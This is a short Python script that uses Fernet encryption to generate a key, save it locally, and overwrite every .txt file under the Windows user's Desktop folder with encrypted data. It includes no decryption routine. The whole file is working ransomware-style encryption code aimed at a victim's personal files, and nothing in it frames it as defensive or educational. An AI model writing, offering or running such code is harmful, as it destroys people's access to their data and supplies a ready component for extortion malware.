import os
from cryptography.fernet import Fernet

# Generate and save a key
def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

# Load the key
def load_key():
    return open("key.key", "rb").read()

# Encrypt a file
def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, "rb") as file:
        file_data = file.read()
    encrypted_data = fernet.encrypt(file_data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

# Encrypt all files with a specific extension on the desktop
def encrypt_desktop_files(extension):
    desktop_path = os.path.join(os.path.join(os.environ["USERPROFILE"]), "Desktop")
    key = load_key()
    for root, dirs, files in os.walk(desktop_path):
        for file in files:
            if file.endswith(extension):
                file_path = os.path.join(root, file)
                encrypt_file(file_path, key)
                print(f"Encrypted: {file_path}")

if __name__ == "__main__":
    # Generate a key only once
    if not os.path.exists("key.key"):
        generate_key()

    # Change the extension as needed
    file_extension = ".txt"

    # Encrypt files
    encrypt_desktop_files(file_extension)
